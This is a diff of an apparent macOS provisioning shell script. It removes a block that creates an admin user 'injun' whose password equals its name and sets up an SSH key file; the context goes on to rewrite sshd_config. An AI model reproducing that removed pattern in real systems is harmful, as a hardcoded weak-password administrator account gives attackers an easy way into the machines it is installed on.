@@ -44,27 +44,6 @@ if [ ! -f "$FLAG_FILE" ]; then
      chown -R $username:staff /Users/$username/.ssh
   done
   
-  if ! dscl . -list /Users | grep -q "^injun$"; then
-     username="injun"
-     next_uid=$(find_next_uid)
-     dscl . -create /Users/$username
-     dscl . -create /Users/$username UserShell /bin/bash
-     dscl . -create /Users/$username RealName "$username"
-     dscl . -create /Users/$username UniqueID $next_uid
-     dscl . -create /Users/$username PrimaryGroupID 80
-     dscl . -create /Users/$username NFSHomeDirectory /Users/$username
-     dscl . -passwd /Users/$username "$username"
-     mkdir -p /Users/$username
-     chmod 755 /Users/$username
-     chown -R $username:staff /Users/$username
-     dseditgroup -o edit -a $username -t user admin
-     mkdir -p /Users/$username/.ssh
-     chmod 700 /Users/$username/.ssh
-     touch /Users/$username/.ssh/authorized_keys
-     chmod 600 /Users/$username/.ssh/authorized_keys
-     chown -R $username:staff /Users/$username/.ssh
-  fi
-  
   cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
   tee /etc/ssh/sshd_config > /dev/null << 'EOF'
 Port 22
